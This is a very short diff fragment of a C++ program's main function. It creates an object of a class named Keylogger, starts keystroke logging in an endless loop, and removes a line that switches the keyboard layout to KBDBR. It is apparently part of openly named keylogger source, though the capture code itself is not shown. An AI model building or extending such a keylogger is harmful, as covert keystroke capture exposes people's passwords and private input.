@@ -3,7 +3,6 @@
 int main(int argc, char** argv) {
 	Keylogger keyboard;
 
-	keyboard.changeLayout(L"KBDBR");
 	keyboard.startKeylog();
 
 	while (true) {
